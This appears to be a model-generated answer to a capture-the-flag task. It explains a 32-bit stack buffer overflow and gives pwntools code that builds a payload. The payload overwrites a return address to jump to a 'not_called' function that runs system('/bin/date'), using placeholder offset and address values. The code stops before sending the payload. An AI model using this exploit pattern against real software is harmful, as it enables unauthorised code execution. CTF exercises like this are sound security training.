code(prefix='To solve this CTF challenge using `pwntools`, we need to exploit the buffer overflow vulnerability in the `vulnerable_function` function. The goal is to overwrite the return address on the stack with the address of the `not_called` function, which calls `system("/bin/date")`. This will allow us to execute the `system` call and potentially gain a shell or execute arbitrary commands.

Steps:
1. Identify the offset to the return address.
2. Find the address of the `not_called` function.
3. Craft the payload to overwrite the return address with the address of `not_called`.
4. Send the payload to the vulnerable function.', imports='from pwn import *', code="# Start a process or connect to a remote service
binary_path = './vulnerable_binary'

# Context settings
context.binary = binary_path
context.arch = 'i386'

# Start the process
io = process(binary_path)

# Find the offset to the return address
offset = cyclic_find(0x61616161)  # Replace 0x61616161 with the pattern found in the crash

# Find the address of the not_called function
not_called_addr = p32(0x080484A4)  # Replace with the actual address of not_called

# Craft the payload
payload = b'A' * offset
payload += not_called_addr

# Send the payload
